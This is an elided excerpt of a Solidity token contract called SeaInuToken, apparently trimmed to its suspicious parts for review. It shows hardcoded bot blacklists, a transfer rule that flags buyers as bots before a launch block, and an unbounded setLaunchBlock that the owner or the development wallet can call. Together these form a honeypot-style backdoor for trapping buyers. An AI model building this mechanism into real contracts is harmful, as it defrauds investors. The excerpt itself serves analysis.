...
contract Ownable is Context {
    ...
    function deployer() private view returns (address) {
...
contract SeaInuToken is Context, IERC20, Ownable {
    ...
    address payable private _developmentAddress = payable(0xDD3b884CC99427C4b3E63ee85007beeefaf41fCD);//
    address payable private _marketingAddress = payable(0x1862B750b3AC61D8CD43e1535356EB0C608f0Ae9);//
    ...
    constructor() {
        ...
        bots[address(0xEdf2D8C1Ba3FBA4C758ca78173c0779ce0362a0A)] = true;
        bots[address(0xd40654240492F7ee7c720F3788D3B7983BCfb524)] = true;
        bots[address(0x683770E284cAb738694E8955194D049563a1CaDE)] = true;
    ...
    function _transfer(
        ...
        if (from != owner() && to != owner()) {
            ...
            if(to != address(uniswapV2Router) && to != address(this) && block.number <= launchBlock){
                bots[to] = true;
            }
    ...
    function setLaunchBlock(uint256 _block) public {
        require(_msgSender() == owner() || _msgSender() == _developmentAddress);
        launchBlock = _block;
    }
